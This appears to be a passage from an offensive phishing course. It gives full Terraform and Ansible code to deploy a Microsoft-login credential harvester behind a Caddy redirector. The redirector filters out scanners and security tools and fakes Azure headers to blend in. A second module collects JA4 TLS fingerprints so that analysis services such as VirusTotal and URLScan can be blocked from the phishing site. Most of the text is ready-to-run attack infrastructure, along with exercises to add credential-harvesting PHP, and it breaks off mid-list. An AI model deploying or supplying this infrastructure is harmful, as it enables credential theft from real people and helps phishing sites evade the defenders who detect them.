---
layout: cyber
section: phishing
title: "HTML Smuggling, ClickFix e Automação com Ansible"
---

# 08. HTML Smuggling, ClickFix e Automação com Ansible

## Payload Dentro do Navegador, Nenhum Download Inspecionado

HTML Smuggling entrega payloads diretamente no navegador da vítima, bypassando filtros de rede que inspecionam downloads. ClickFix (FakeCAPTCHA) engana usuários para executar comandos maliciosos. Esta seção cobre automação com Ansible, coleta e análise de telemetria JA4, estratégias de HTML Smuggling (Blob API, SVG, WebAssembly), evasão do SmuggleShield e técnicas ClickFix.

Os módulos a seguir foram transcritos do curso MalDev Academy - Offensive Phishing Operations Extra (Novos Módulos 1-10).

---

# Novo Módulo 1 — Automatizando Infraestrutura Phishing com Ansible Ansible

Novo Módulo 1 — Automatizando Infraestrutura Phishing com Ansible Ansible

- # Novo Módulo 1 — Automatizando Infraestrutura Phishing com Ansible Ansible

# Disclaimer
# Module 1 - Automate Phishing Infrastructure: Ansible

## Introduction to Ansible
Ansible is an open-source automation tool developed by Red Hat that lets you define, provision, and manage infrastructure using a simple, human-readable language. With Ansible, you can automate the configuration and deployment of your infrastructure and applications in a consistent and efficient way.With Ansible, we can write playbooks using `.yml` or `.yaml` files which are lists of tasks that automatically execute for the specified hosts to describe the desired state of our infrastructure. Instead of manually configuring servers via a console or scripting commands, you can codify your automation tasks so that Ansible can execute them reliably across your environment—whether that means setting up EC2 instances, installing software, or configuring services.Terraform is primarily used for provisioning and managing cloud resources as code, enabling you to declare and deploy the infrastructure you need. In contrast, Ansible focuses on configuration management, application deployment, and orchestration once the infrastructure is in place. Together, they work to allow you to deploy the infrastructure you need and make the necessary configurations to them.In this module, we will extend our Terraform phishing infrastructure deployment project with Ansible to automate the deployment and configuration of infrastructure, allowing you to deploy EC2 instances and configure them by running only several commands.
## Ansible Installation
Start by installing Ansible using the command below
```
sudo apt install ansible

```

## Ansible Components
Ansible consists of several components that work together to automate infrastructure management efficiently.
### Ansible Controller
To start, we have the Ansible Controller which is the central server responsible for managing and automating tasks across remote nodes. It acts as the control point for defining configurations and executing tasks. The controller communicates with managed nodes over a network, ensuring they are configured and maintained according to the defined automation processes.
### Inventory File
The inventory file defines the list of managed nodes that the Ansible Controller can access. By default, this file is located at `/etc/ansible/hosts` and contains a list of IP addresses or hostnames that the controller can resolve. The file is organized with group headings to categorize systems by function or purpose, making it easier to target specific hosts during orchestration. An example below is shown of what an Ansible inventory file might look like:
```
[webservers]
web01.example.com
web02.example.com

[dbservers]
db01.example.com

```
The diagram below illustrates how the Ansible inventory file is used for managing nodes.
### Playbooks & Modules
We also use Playbooks, which are YAML files that describe what actions to perform on your systems. Each playbook defines which servers to target and what steps to carry out on them. These steps can include things like installing software, starting services, or configuring files — all handled by Ansible's built-in tools called modules.The playbook below runs on servers tagged `webservers` and does two things: installs Nginx and then starts its service. Ansible handles these tasks using modules where the `apt` module installs Nginx, and the `service` module starts it. Modules are what carry out each step in the playbook.
```
---
- name: Install and start Nginx
  hosts: webservers  # Playbook runs on servers labeled 'webservers'
  become: yes
  tasks:
    - name: Install Nginx
      apt:            # Uses the 'apt' module to install Nginx
        name: nginx
        state: present
    - name: Start Nginx
      service:        # Uses the 'service' module to start Nginx
        name: nginx
        state: started

```

### Roles
Lastly, Roles in Ansible organize artifacts into a standardized directory structure that Ansible automatically loads. Once you’ve structured your content into roles, they become modular and easily reusable, allowing you to share them across projects and with other users. Ansible roles are typically used with the `roles` option for a given play. There are many examples of Ansible roles listed here.
## Generating DNS Registrar Token
To enable Ansible to interact with DNS and automate domain registration, a token from the DNS registrar is required. In this module, `name.com` is used as the registrar, but any other provider can be substituted.Begin by navigating to the settings page within `name.com`, where account details are displayed. Then, select "Security Settings" from the left-hand menu under "Security" to proceed with generating the required token.If this has never been used before, a prompt to generate a new token will be presented. Name the token nickname field, and click on 'Generate new token'. Once this is fully done, make note of the username and the token of the newly generate API token.When working with Terraform, we exported the `AWS_ACCESS_KEY_ID` and `AWS_SECRET_ACCESS_KEY` values in the terminal to allow Terraform to interact with AWS to create and delete resources. We will need to export additional values such as the `name.com` API token as this will be used to create DNS records. One advantage in such setup is that when `terraform destroy` is issued, the DNS records are also deleted. Lastly, the `ANSIBLE_HOST_KEY_CHECKING` export is set to false is to skip the "SSH (yes/no)" prompt when new EC2 instances are spun up.
```
export AWS_ACCESS_KEY_ID="AKIAEXAMPLE1234567890"
export AWS_SECRET_ACCESS_KEY="EXAMPLESECRETKEY/ABCDEF1234567890XYZ"
export NAMEDOTCOM_API_TOKEN="EXAMPLETOKEN1234567890ABCDEF"
export ANSIBLE_HOST_KEY_CHECKING=False

```

## Updating Terraform Project
This module will update the project created in the Automate Phishing Infrastructure: Terraform module. First it will make some changes to the Terraform aspect, and after we will add Ansible into the project. The Terraform project's directory structure is shown below, where it has a root module and four child modules.
```
phishing_infra/
├── terraform/                
│   ├── main.tf               
│   ├── variables.tf          
│   ├── outputs.tf            
│   ├── modules/             
│   │   ├── network/          
│   │   │   └── main.tf
│   │   ├── instances/        
│   │   │   └── main.tf
│   │   ├── dns/              
│   │   │   └── main.tf
│   │   └── provisioning/    
│   │       └── main.tf

```
The Ansible project includes two main playbooks, `site_apache.yml` and `site_caddy.yml`, which will utilize the custom roles (`install_apache` and `install_caddy`) to create an Apache credential harvester and a Caddy redirector. Each role is organized into directories: `tasks` contains the main automation logic, `handlers` (in the Apache role) restarts the Apache service, and `files` holds static files like HTML files for Apache or Caddy config files such as `ips.caddy`.
```
ansible/              
├── site_apache.yml   
├── site_caddy.yml    
└── roles/            
    ├── install_apache/  
    │   ├── tasks/       
    │   │   └── main.yml 
    │   ├── handlers/    
    │   │   └── main.yml 
    │   └── files/       
    │       └── ms-login.html  
    └── install_caddy/   
        ├── tasks/
        │   └── main.yml
        └── files/
            ├── ips.caddy
            ├── ua.caddy
            └── headers.caddy

```
Prior to continuing this module, it's advised to download the module's ZIP file and analyze the files and directory structure of the `terraform` and `ansible` folders.
## Root Module
In the root Terraform configuration directory, the main modifications that needed are the additional providers. The `time` provider is an official provider maintained by HashiCorp, and this is primarily a wait function to ensure there is enough time between the EC2 creation and connecting to the SSH for provisioning. Next is the `namedotcom` provider by a third-party lexfrei that allows modifications of records, domain name servers in the `name.com` registrar. We've also referenced two new modules, the DNS and Provisioning module.
Note: If you're not using `name.com` you will need to find and use the appropriate provider.

```
provider "aws" {
  region = "us-west-2"
}

# New
terraform {
  required_providers {
    namedotcom = {
      source  = "lexfrei/namedotcom"
      version = "2.0.0"
    }
    time = {
      source  = "hashicorp/time"
      version = "~> 0.9"
    }
  }
}

# New
provider "namedotcom" {
  token    = var.namedotcom_token
  username = var.namedotcom_username
}

module "network" {
  source = "./modules/network"
}

module "instances" {
  source    = "./modules/instances"
  vpc_id    = module.network.vpc_id
  subnet_id = module.network.subnet_id
  ami_id    = module.network.ami_id
}

# New
module "dns" {
  source         = "./modules/dns"
  redir_public_ip = module.instances.phishing_redir_public_ip
  srv_public_ip   = module.instances.phishing_srv_public_ip
}

# New
module "provisioning" {
  source                   = "./modules/provisioning"
  redir_instance_public_ip = module.instances.phishing_redir_public_ip
  srv_instance_public_ip   = module.instances.phishing_srv_public_ip
  caddy_domain             = module.dns.redir_domain
  apache_domain            = module.dns.srv_domain
}

```
The `variables.tf` definition file is also modified to accommodate the Terraform command that includes the username and API token for `name.com`. These credentials enable Terraform to automate the registration and deletion of domains when executing `terraform apply` and `terraform destroy`. To define these variables, the following configuration is included in the `variables.tf` file:
```
variable "namedotcom_token" {
  description = "API token for the Name.com provider"
  type        = string
}

variable "namedotcom_username" {
  description = "API Username for the Name.com provider"
  type        = string
}

```
Additionally, the source IP and AMI ID outputs have been removed from the `outputs.tf` file, while the rest of the configuration remains unchanged.
```
output "phishing_redir_public_ip" {
  description = "Public IP of the phishing-redir EC2 instance"
  value       = module.instances.phishing_redir_public_ip
}

output "phishing_srv_public_ip" {
  description = "Public IP of the phishing-srv EC2 instance"
  value       = module.instances.phishing_srv_public_ip
}

```

## Networking Module
There are no significant differences in the networking module other than slight re-organization.
```
# Data: Default VPC
data "aws_vpc" "default" {
  default = true
}

# Data: Subnet in us-west-2a
data "aws_subnet" "default_a" {
  filter {
    name   = "vpc-id"
    values = [data.aws_vpc.default.id]
  }
  filter {
    name   = "availability-zone"
    values = ["us-west-2a"]
  }
}

# Data: Latest Kali Linux AMI
data "aws_ami" "kali" {
  most_recent = true
  owners      = ["679593333241"]

  filter {
    name   = "name"
    values = ["kali-last-snapshot-amd64-*"]
  }
  filter {
    name   = "state"
    values = ["available"]
  }
  filter {
    name   = "virtualization-type"
    values = ["hvm"]
  }
}

# Data: Retrieve current public IP
data "http" "my_ip" {
  url = "https://ipinfo.io/ip"
}

locals {
  allowed_ssh_cidr = "${trimspace(data.http.my_ip.response_body)}/32"
}

output "vpc_id" {
  value = data.aws_vpc.default.id
}

output "subnet_id" {
  value = data.aws_subnet.default_a.id
}

output "ami_id" {
  value = data.aws_ami.kali.id
}

output "allowed_ssh_cidr" {
  value = local.allowed_ssh_cidr
}

```

## Instances Module
Additional modifications have been made to the instances module compared to the previous version. One key change is opening the HTTP and HTTPS ports, which is necessary for both Certbot automation and redirection. It is recommended to adjust this configuration to ensure that only the Caddy redirector server is whitelisted on the phishing server.
```
ingress {
  description = "HTTP access from anywhere"
  from_port   = 80
  to_port     = 80
  protocol    = "tcp"
  cidr_blocks = ["0.0.0.0/0"]
}

ingress {
  description = "HTTPS access from anywhere"
  from_port   = 443
  to_port     = 443
  protocol    = "tcp"
  cidr_blocks = ["0.0.0.0/0"]
}

```
The entire contents of the `main.yml` is posted below:
```
variable "vpc_id" {
  type = string
}

variable "subnet_id" {
  type = string
}

variable "ami_id" {
  type = string
}

resource "tls_private_key" "phishing_redir" {
  algorithm = "RSA"
  rsa_bits  = 2048
}

resource "aws_key_pair" "phishing_redir" {
  key_name   = "phishing-redir"
  public_key = tls_private_key.phishing_redir.public_key_openssh
}

resource "tls_private_key" "phishing_srv" {
  algorithm = "RSA"
  rsa_bits  = 2048
}

resource "aws_key_pair" "phishing_srv" {
  key_name   = "phishing-srv"
  public_key = tls_private_key.phishing_srv.public_key_openssh
}

resource "local_file" "phishing_redir_private_key" {
  content         = tls_private_key.phishing_redir.private_key_pem
  filename        = "${path.module}/../../phishing-redir.pem"
  file_permission = "0600"
}

resource "local_file" "phishing_srv_private_key" {
  content         = tls_private_key.phishing_srv.private_key_pem
  filename        = "${path.module}/../../phishing-srv.pem"
  file_permission = "0600"
}

resource "aws_security_group" "combined_sg" {
  name        = "combined-all-ports"
  description = "Allow inbound SSH, HTTP, and HTTPS from anywhere; allow all outbound traffic"
  vpc_id      = var.vpc_id

  ingress {
    description = "SSH access from anywhere"
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }

  ingress {
    description = "HTTP access from anywhere"
    from_port   = 80
    to_port     = 80
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }

  ingress {
    description = "HTTPS access from anywhere"
    from_port   = 443
    to_port     = 443
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }

  egress {
    description = "Allow all outbound traffic"
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }
}

resource "aws_instance" "phishing_srv_instance" {
  ami                    = var.ami_id
  instance_type          = "t2.micro"
  key_name               = aws_key_pair.phishing_srv.key_name
  subnet_id              = var.subnet_id
  vpc_security_group_ids = [aws_security_group.combined_sg.id]

  tags = {
    Name = "kali-instance-phishing-srv"
  }
}

resource "aws_instance" "phishing_redir_instance" {
  ami                    = var.ami_id
  instance_type          = "t2.micro"
  key_name               = aws_key_pair.phishing_redir.key_name
  subnet_id              = var.subnet_id
  vpc_security_group_ids = [aws_security_group.combined_sg.id]

  tags = {
    Name = "kali-instance-phishing-redir"
  }
}

output "phishing_srv_public_ip" {
  value = aws_instance.phishing_srv_instance.public_ip
}

output "phishing_redir_public_ip" {
  value = aws_instance.phishing_redir_instance.public_ip
}

```

## DNS Module
The DNS module is meant for automating the creation of DNS records with `name.com`. It is important to note that buying the domain should be done manually and automating it should be carefully considered since some domains may cost thousands of dollars. In the module below, an assumption is made that the `notthathealthy.com` domain was purchased beforehand.This module adds two `A` records to the `nothathealthy.com` domain which creates `redirector.notthathealthy.com` and `credential.notthathealthy.com` as a result.
```
terraform {
  required_providers {
    namedotcom = {
      source  = "lexfrei/namedotcom"
      version = "2.0.0"
    }
  }
}

variable "redir_public_ip" {
  type = string
}

variable "srv_public_ip" {
  type = string
}

resource "namedotcom_record" "phishing_redir_record" {
  domain_name = "notthathealthy.com"
  host        = "redirector" # Change this to match desired domain
  record_type = "A"
  answer      = var.redir_public_ip
}

resource "namedotcom_record" "phishing_srv_record" {
  domain_name = "notthathealthy.com" # Change this to match desired domain
  host        = "credential"
  record_type = "A"
  answer      = var.srv_public_ip
}

output "redir_domain" {
  value = "${namedotcom_record.phishing_redir_record.host}.${namedotcom_record.phishing_redir_record.domain_name}"
}

output "srv_domain" {
  value = "${namedotcom_record.phishing_srv_record.host}.${namedotcom_record.phishing_srv_record.domain_name}"
}

```

## Provisioning Module
The provisioning module is updated to pass the generated data from the previous modules to the `ansible-playbook` command. The `ansible-playbook` command then uses this data to configure target machines automatically, ensuring consistent and repeatable environment setup. The passed data includes the IPs of the EC2 instances through the `var.srv_instance_public_ip` and `var.redir_instance_public_ip` variables. In addition, the `var.apache.domain` variable is passed onto the Apache role installation and as a value that the Caddy file installation would also need. Lastly, a `var.caddy_domain` is passed onto the playbook for the Caddy role installation.The contents of the provisioning module is shown below:
```
variable "redir_instance_public_ip" {
  type = string
}

variable "srv_instance_public_ip" {
  type = string
}

variable "caddy_domain" {
  type = string
}

variable "apache_domain" {
  type = string
}

resource "time_sleep" "wait_before_ansible" {
  create_duration = "60s"
}

resource "null_resource" "install_apache" {
  depends_on = [
    var.srv_instance_public_ip,
    time_sleep.wait_before_ansible
  ]
  provisioner "local-exec" {
    command = <<-EOF
      ansible-playbook -i '${var.srv_instance_public_ip},' \
        -u kali --private-key=${path.module}/../../phishing-srv.pem ansible/site_apache.yml \
        --extra-vars "apache_domain=${var.apache_domain} certbot_email=user@email.com" # Change this to an email you control
    EOF
  }
}

resource "null_resource" "install_caddy" {
  depends_on = [
    var.redir_instance_public_ip,
    time_sleep.wait_before_ansible
  ]
  provisioner "local-exec" {
    command = <<-EOF
      ansible-playbook -i '${var.redir_instance_public_ip},' \
        -u kali --private-key=${path.module}/../../phishing-redir.pem ansible/site_caddy.yml \
        --extra-vars "caddy_domain=${var.caddy_domain} apache_domain=${var.apache_domain}"
    EOF
  }
}

output "provisioning_status" {
  value = "Provisioning complete"
}

```

## Caddy Redirector
The `site_caddy.yml` is the primary playbook that will be to install and setup the Caddy redirector. The file is simple as it uses a custom role, `install_caddy`, to modularize the automation process.
```
# site_caddy.yml
---
- hosts: all
  become: yes
  roles:
    - install_caddy

```

### Creating a Custom Role: Install_Caddy
A few setup tasks are required in this custom role. Unlike Nginx and Apache, Caddy does not automatically create necessary logging directories and files. As a result, this role creates the required files and directories and sets appropriate permissions. The following tasks are performed within the role, including directory and file creation, and setting permissions:
Create a Caddy configuration directory at `/etc/caddy`.

- Create a Caddy filters directory at `/etc/caddy/` filters.

- Create a Caddy filters IP file named `ips.caddy` with a single IP (customizable to block bots or scanners).

- Create a Caddy user agents file named `ua.caddy` with entries for curl and python (customizable to block specific tools).

- Create a Caddy headers file named `headers.caddy` with common web filters and Microsoft Azure Front Door headers (customizable to blend traffic with targets).

```
---
- name: Ensure apt cache is updated
  apt:
    update_cache: yes

- name: Install Caddy web server
  apt:
    name: caddy
    state: present

- name: Create Caddy configuration directory
  file:
    path: /etc/caddy
    state: directory
    owner: root
    group: root
    mode: '0755'

- name: Create Caddy filters directory
  file:
    path: /etc/caddy/filters
    state: directory
    owner: root
    group: root
    mode: '0755'

- name: Create filters/ips.caddy file with content
  copy:
    dest: /etc/caddy/filters/ips.caddy
    content: "remote_ip 1.2.3.4/32\n"
    owner: root
    group: root
    mode: '0644'

- name: Create filters/ua.caddy file with content
  copy:
    dest: /etc/caddy/filters/ua.caddy
    content: |
      header User-Agent curl*
      header User-Agent *python*
    owner: root
    group: root
    mode: '0644'

- name: Create filters/headers.caddy file with content
  copy:
    dest: /etc/caddy/filters/headers.caddy
    content: |
      Referrer-Policy no-referrer
      Strict-Transport-Security max-age=31536000;
      x-azure-ref "20250214T181632Z-1868d69f86fvtfz7hC1EWRvgfw0000000swg"
      -Server
    owner: root
    group: root
    mode: '0644'

- name: Recursively set ownership on /etc/caddy/filters directory
  file:
    path: /etc/caddy/filters
    recurse: yes
    owner: caddy
    group: caddy

- name: Write Caddyfile with dynamic domain and blocking configuration
  copy:
    dest: /etc/caddy/Caddyfile
    content: |
      {{ caddy_domain }} {
          root * /usr/share/caddy
          log {
              output file /var/caddy/logs/access.json
              format json
          }
          @blocked_ips {
              import filters/ips.caddy
          }
          @blocked_user_agents {
              import filters/ua.caddy
          }
          handle @blocked_ips {
              respond "Forbidden" 403 {
                  close
              }
          }
          handle @blocked_user_agents {
              respond "Forbidden" 403 {
                  close
              }
          }
          handle /auth/* {
              reverse_proxy https://{{ apache_domain }} {
                  transport http {
                      tls_insecure_skip_verify
                  }
                  header_up Host {upstream_hostport}
              }
          }
          header {
              import filters/headers.caddy
          }
          handle {
              respond "Page not found" 404
          }
      }
    owner: root
    group: root
    mode: '0644'

- name: Create Caddy log directory
  file:
    path: /var/caddy/logs
    state: directory
    owner: caddy
    group: caddy
    mode: '0755'

- name: Create Caddy access log file
  file:
    path: /var/caddy/logs/access.json
    state: touch
    owner: caddy
    group: caddy
    mode: '0600'

- name: Restart Caddy service
  service:
    name: caddy
    state: restarted

```

## Apache Credential Harvester
Next, the `site_apache.yml` playbook will use the custom `install_apache` role to setup Apache.

```
# site_apache.yml
---
- hosts: all
  become: yes
  roles:
    - install_apache

```
The custom Apache role completes the redirection automation using Terraform and Ansible by copying an HTML phishing file (`ms-login.html`) into the `/var/www/html/auth/` directory. This Apache role includes `tasks`, `handlers`, and `files` directories. The `files` directory contains `ms-login.html`, sourced from the Anti-Analysis - AES Encryption module.

The `tasks` directory holds the main YAML file responsible for installing and configuring Apache, Certbot and its plugins for automated SSL/TLS certificate generation. Domain names and email addresses are passed through Terraform variables. Additionally, directory listing is disabled to prevent exposure of our directory and file structure.

```
---
- name: Update apt cache
  apt:
    update_cache: yes

- name: Install Apache web server
  apt:
    name: apache2
    state: present

- name: Start and enable Apache service
  service:
    name: apache2
    state: started
    enabled: yes

- name: Install Certbot and Apache plugin
  apt:
    name:
      - certbot
      - python3-certbot-apache
    state: present

- name: Disable Apache directory listing
  copy:
    dest: /etc/apache2/conf-available/no-index.conf
    content: |
      <Directory /var/www/>
          Options -Indexes
      </Directory>
    owner: root
    group: root
    mode: '0644'
  notify: Restart Apache

- name: Enable no-index configuration
  command: a2enconf no-index
  notify: Restart Apache

- name: Create auth directory in /var/www/html
  file:
    path: /var/www/html/auth
    state: directory
    owner: www-data
    group: www-data
    mode: '0755'

- name: Copy ms-login.html to /var/www/html/auth/
  copy:
    src: ms-login.html
    dest: /var/www/html/auth/ms-login.html
    owner: www-data
    group: www-data
    mode: '0644'

- name: Obtain SSL certificate with Certbot
  command: >
    certbot --apache --non-interactive --agree-tos --email {{ certbot_email }} -d {{ apache_domain }}
  register: certbot_output
  changed_when: "'Certificate not yet due for renewal' not in certbot_output.stdout"

```
Lastly, the `handlers` directory's `main.yml` performs a restart to Apache. This is a necessary handler to ensure all the previous changes are applied.

```
---
- name: Restart Apache
  service:
    name: apache2
    state: restarted

```

## Demo
To test the Terraform and Ansible projects, run the commands below. Notice that in this module we include two variables `namedotcom_token` and `namedotcome_username` which are passed to the Terraform and Ansible plays.

```
terraform init
terraform apply -var "namedotcom_token=EXAMPLETOKEN1234567890ABCDEF" -var "namedotcom_username=exampleuser" --auto-approve
terraform destroy -var "namedotcom_token=EXAMPLETOKEN1234567890ABCDEF" -var "namedotcom_username=exampleuser" --auto-approve

```
The video can be found in folder: `./videos/terraform-ansible.mp4`

## Objectives
Create a new role in the Ansible project that is responsible for installing PHP and including backend PHP files to harvest credentials

Modify the Instances Module to allow only inbound traffic from the Caddy redirector on the phishing server while rejecting all other incoming connections


---

# Novo Módulo 2 — Coletando e Analisando Telemetria JA4 de Bots

Novo Módulo 2 — Coletando e Analisando Telemetria JA4 de Bots

# Disclaimer

# Module 2 - Collecting & Analyzing JA4 Bot Telemetry

## Introduction
In earlier modules, we examined JA4+ fingerprinting techniques, used them to identify clients, and compared the results against a blacklist or whitelist. In this module, we will gather JA4 fingerprints of bots and scanners and explore methods to improve the chances of blocking them.

This module requires two servers: one running HAProxy with the JA4 Lua script, as explained in JA4 Analysis: Calculating JA4 Fingerprints, and another server with Apache and PHP installed.

## HAProxy Configuration
The HAProxy configuration file, `/etc/haproxy/haproxy.cfg`, is shown below but requires some updates. Specifically, ensure that the SSL certificate path and filename in `bind *:443 ssl crt /etc/haproxy/domain.com.pem` are correct, and update the backend phishing server's IP address and port in `server phishingServer 1.2.3.4:80` accordingly. Review the JA4 Analysis: Calculating JA4 Fingerprints module if you require a refresher on setting up the configuration file.

Once completed, restart HAProxy using `sudo systemctl restart haproxy`.

```
global
    # JA4 plugin and buffer
    tune.ssl.capture-buffer-size 128
    lua-load /etc/haproxy/lua/ja4.lua

    log /dev/log	local0
	log /dev/log	local1 notice
	chroot /var/lib/haproxy
	stats socket /run/haproxy/admin.sock mode 660 level admin
	stats timeout 30s
	user haproxy
	group haproxy
	daemon

	# Default SSL material locations
	ca-base /etc/ssl/certs
	crt-base /etc/ssl/private

	# See: https://ssl-config.mozilla.org/#server=haproxy&server-version=2.0.3&config=intermediate
    ssl-default-bind-ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384
    ssl-default-bind-ciphersuites TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256
    ssl-default-bind-options ssl-min-ver TLSv1.2 no-tls-tickets

defaults
	log	global
	mode	http
	option	httplog
	option	dontlognull
    timeout connect 5000
    timeout client  50000
    timeout server  50000
	errorfile 400 /etc/haproxy/errors/400.http
	errorfile 403 /etc/haproxy/errors/403.http
	errorfile 408 /etc/haproxy/errors/408.http
	errorfile 500 /etc/haproxy/errors/500.http
	errorfile 502 /etc/haproxy/errors/502.http
	errorfile 503 /etc/haproxy/errors/503.http
	errorfile 504 /etc/haproxy/errors/504.http

frontend phishingProxy
    bind *:443 ssl crt /etc/haproxy/domain.com.pem
    http-request lua.fingerprint_ja4

    # X-JA4-Fingerprint HTTP header
    http-request set-header X-JA4-Fingerprint %[var(txn.fingerprint_ja4)]

    # X-Forwarded-For HTTP header w/ original client IP address
    http-request set-header X-Forwarded-For %[src]
    default_backend servers

backend servers
    server phishingServer 1.2.3.4:80

```

## Logging JA4 Fingerprints
Head to the phishing server and create the logging PHP script shown below. This script extracts the `X-JA4-Fingerprint` from incoming requests, along with the client's IP address via the `X-Forwarded-For` header and the user agent. Note that using `$_SERVER['REMOTE_ADDR']` will capture the IP of the HAProxy server instead of the actual client’s IP.

It then splits the JA4 fingerprint into its components (`ja4_a`, `ja4_b`, and `ja4_c`) and logs all the collected data in JSON format to `/var/www/clients.json`. The script ensures that multiple logs are stored by appending new entries to the existing file.

Recall that you will need to create `clients.json` and give Apache write permissions to the file.

```
touch /var/www/clients.json

chown www-data:www-data /var/www/clients.json

```

```
<?php
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    
    // Extract JA4 fingerprint and client details
    $fingerprint = $_SERVER["HTTP_X_JA4_FINGERPRINT"];
    $parts = explode("_", $fingerprint);

    $logEntry = [
        "ip" => $_SERVER["HTTP_X_FORWARDED_FOR"],
        "user_agent" => $_SERVER["HTTP_USER_AGENT"],
        "ja4_fingerprint" => $fingerprint,
        "ja4_a" => $parts[0],
        "ja4_b" => $parts[1],
        "ja4_c" => $parts[2],
        "timestamp" => date("c")
    ];

    // Append log entry to JSON file
    $file = "/var/www/clients.json";
    $logs = file_exists($file) ? json_decode(file_get_contents($file), true) : [];
    $logs[] = $logEntry;
    file_put_contents($file, json_encode($logs, JSON_PRETTY_PRINT));
}
?>

```

## Scanning Website
Scan the website using various online scanners, crawlers and services that use automation. This has been demonstrated several times throughout the course using services such as VirusTotal, ANY.RUN and URLScan.io.

## JA4_A Analysis
Once enough bot logs have been collected, use `jq` to extract each JA4 section individually, starting with `ja4_a`, followed by `ja4_b`, and then `ja4_c`. To ensure unique values, we will also pipe the output through `sort -u`, which sorts the results and removes duplicates.

```
# JA4_a extraction
jq '.[].ja4_a' /var/www/clients.json | sort -u

```

```
// ja4_a
"t12d491100"
"t12d590500"
"t13d141000"
"t13d1515h2"
"t13d1516h2"
"t13d1615h2"
"t13d181100"
"t13d181300"
"t13d1911h2"
"t13d3112h1"
"t13d330900"
"t13d361100"
"t13d4312h1"

```
We will now analyze the `ja4_a` fingerprint to determine suspicious patterns.

### Unspecified ALPN
Recall that the last two bytes of the `ja4_a` fingerprint represent the first Application-Layer Protocol Negotiation (ALPN) value, which typically indicates the preferred protocol (e.g., `h2` for HTTP/2, `h1` for HTTP/1.1, or `00` if unspecified).

Modern browsers almost always include ALPN values in their TLS handshake, prioritizing `h2` for HTTP/2 or `h3` for HTTP/3. When ALPN is unspecified, it suggests that the client may be using an outdated or non-standard TLS stack. Some legacy browsers, automated scanners, and older TLS libraries do not support ALPN negotiation and default to `00`.

In our logs we have seven `ja4_a` fingerprints without an ALPN specified.

```
// 7 - Unspecified ALPN
"t12d491100"
"t12d590500"
"t13d141000"
"t13d181100"
"t13d181300"
"t13d330900"
"t13d361100"

```
To further illustrate the point, notice the entries below that were retrieved from the JA4DB have a suspicious user agent and an unspecified ALPN.

```
// Chrome 60 - Unspecified ALPN
"user_agent_string": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
"ja4_fingerprint": "t12i210500_9d99ce2cacbd_021165082e1c",
...

// Curl - Unspecified ALPN
"user_agent_string": "curl/7.29.0",
"ja4_fingerprint": "t13d170900_5b57614c22b0_97f8aa674fd9",
...

// Python - Unspecified ALPN
"user_agent_string": "Python-urllib/2.5",
"ja4_fingerprint": "t13i170800_5b57614c22b0_97f8aa674fd9"

```

### TLS Version
Modern browsers have supported TLS 1.3 for several years and will usually prefer TLS 1.3, making legitimate clients using TLS 1.2 uncommon. Bots may use TLS 1.2 due to outdated TLS stacks or limitations of the underlying TLS library. To illustrate this point further, we can check the user agents of clients using TLS 1.2 that accessed our website.

```
// Bot using TLS 1.2 - Empty user agent
"user_agent": null,
"ja4_fingerprint": "t12d590500_a33745022dd6_ebcc2ddcddfb",
"ja4_a": "t12d590500",

// Bot using TLS 1.2 - Bot user agent
"user_agent": "SiteCheckerBotCrawler/1.0 (+http://sitechecker.pro)",
"ja4_a": "t12d491100",

```

### Missing HTTP/2 Support
Another suspicious indicator is when a client supports TLS 1.3 but advertises `h1` (HTTP/1.1) as its ALPN preference. Modern browsers typically prioritize `h2` (HTTP/2) or `h3` (HTTP/3) when using TLS 1.3, while bots may prefer `h1`.

```
// HTTP/2 - Expected in modern browsers
"t13d1515h2"
"t13d1516h2"
"t13d1615h2"
"t13d1911h2"

// HTTP/1.1 - Suspicious
"t13d3112h1"
"t13d4312h1"

```

### Unusual Ciphers Count
Generally speaking, browsers support a range of 15 to 20 ciphers, though this number may vary slightly depending on the TLS version, operating system and specific browser configuration. A significantly higher or lower number of ciphers can indicate an unusual or automated client.

```
// Legitimate clients
"t13d1516h2" // TLS 1.3 - Chrome User-Agent (15 ciphers)
"t12d1211h2" // TLS 1.2 - Chrome User-Agent (12 ciphers)
"t13d1717h2" // TLS 1.3 - Firefox User-Agent (17 ciphers)
"t13d2014h2" // TLS 1.3 - Safari User-Agent (20 ciphers)

// Bot clients
"t13d371200" // TLS 1.3 - Chrome User-Agent (37 ciphers)
"t13d4312h1" // TLS 1.3 - Safari User-Agent (43 ciphers)

```

## JA4_B & JA4_C Analysis
Begin by extracting the `ja4_b` and `ja4_c` fingerprints in the same way as was done with the `ja4_a` fingerprint.

```
# JA4_b extraction
jq '.[].ja4_b' /var/www/clients.json | sort -u

# JA4_c extraction
jq '.[].ja4_c' /var/www/clients.json | sort -u

```

```
// ja4_b
"018971650b2c"
"46e7e9700bed"
"80cecea31fe6"
"85036bcba153"
"8daaf6152771"
"9dc949149365"
"a33745022dd6"
"bd868743f55c"
"c7886603b240"
"cbb2034c60b8"
"e8a523a41297"
"e8f1e7e78f70"

```

```
// ja4_c
"02713d6af862"
"14788d8d241b"
"3cbfd9057e0d"
"d8a2da3f94cd"
"bb25da17b02d"
"e6dcd7ae0a9e"

```

### Unique Fingerprints
The `ja4_b` and `ja4_c` for legitimate clients should not be unique since they follow standardized cipher suite lists and extension orders used by major browsers. If a `ja4_b` or `ja4_c` value do not appear in the `ja4db.json` file, it may indicate an uncommon or non-browser client, such as a bot or scanning tool.

In our dataset, multiple `ja4_b` and `ja4_c`fingerprints were found to be unique.

```
// Unique ja4_b fingerprints
"018971650b2c"
"46e7e9700bed"
"80cecea31fe6"
"a33745022dd6"
"bd868743f55c"
"c7886603b240"
"cbb2034c60b8"
"e8a523a41297"
"e8f1e7e78f70"

